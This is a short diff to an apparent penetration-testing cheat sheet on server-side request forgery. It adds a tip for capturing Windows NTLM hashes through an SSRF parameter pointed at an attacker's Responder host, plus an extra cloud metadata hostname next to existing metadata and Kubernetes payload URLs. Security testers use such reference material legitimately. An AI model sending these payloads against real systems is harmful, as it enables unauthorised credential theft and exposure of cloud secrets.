@@ -2205,6 +2205,8 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   ```
 - If everything fails, look for assets pointing to internal IPs. You can usually find these via CSP headers, JS files, Github, shodan/censys etc. [[Reference](https://twitter.com/bogdantcaciuc7/status/1561572514295341058)]
 - [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
+- If the target runs Windows, try to steal NTLM hashes with Responder [[Reference](https://twitter.com/hacker_/status/1694554700555981176)]
+  - `/vulnerable?url=http://your-responder-host`
 
 **Common endpoints**
 - Webhooks
@@ -2229,6 +2231,8 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - `http://localhost/`
 - `http://169.254.169.254/`
 - `http://169.254.169.254/latest/meta-data/`
+- `http://instance-data`
+  - alternative to `169.254.169.254`
 - `http://metadata.google.internal/`
 - `https://kubernetes.default.svc/metrics` [[Random Robbie's tweet](https://twitter.com/Random_Robbie/status/1072242182306832384)]
 
